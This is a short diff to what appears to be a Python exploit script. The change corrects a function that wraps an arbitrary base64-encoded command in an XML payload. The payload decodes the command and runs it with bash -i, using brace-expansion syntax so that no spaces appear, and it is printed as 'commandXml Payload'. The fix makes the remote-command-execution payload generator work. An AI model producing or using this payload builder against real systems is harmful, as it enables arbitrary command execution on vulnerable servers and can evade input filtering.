@@ -55,7 +55,7 @@ def commandSet(osname,command):
         commandXml = """
             <string>/bin/bash</string>
             <string>-c</string>
-            <string>{echo,{"""+binascii.b2a_base64(command.encode('utf-8')).decode().replace('\n','')+"""}|{base64,-d}|{bash,-i}</string>
+            <string>{echo,"""+binascii.b2a_base64(command.encode('utf-8')).decode().replace('\n','')+"""}|{base64,-d}|{bash,-i}</string>
         """
     print("----------commandXml Payload----------")
     print(commandXml)
